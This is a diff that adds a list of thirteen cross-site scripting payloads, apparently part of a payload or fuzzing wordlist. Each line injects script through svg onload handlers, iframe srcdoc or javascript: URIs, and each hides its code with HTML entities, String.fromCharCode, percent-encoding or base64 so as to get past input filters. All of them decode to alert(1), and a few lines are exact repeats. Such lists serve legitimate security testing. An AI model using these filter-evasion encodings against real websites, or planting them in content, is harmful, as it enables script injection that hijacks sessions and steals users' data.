@@ -1,0 +1,13 @@
+<svg onload='&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)'>
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"></iframe>
+<iframe src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></iframe>
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%29'))"></svg>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<iframe src="javascript:eval(atob('YWxlcnQoMSk='))"></iframe>
+<svg onload="eval(atob('YWxlcnQoMSk='))"></svg>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"></iframe>
+<iframe src="javascript:eval(unescape('%61%6c%65%72%74%28%31%29'))"></iframe>
+<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>"></iframe>
+<iframe src="javascript:eval(atob('YWxlcnQoMSk='))"></iframe>
+<svg onload="eval(atob('YWxlcnQoMSk='))"></svg>
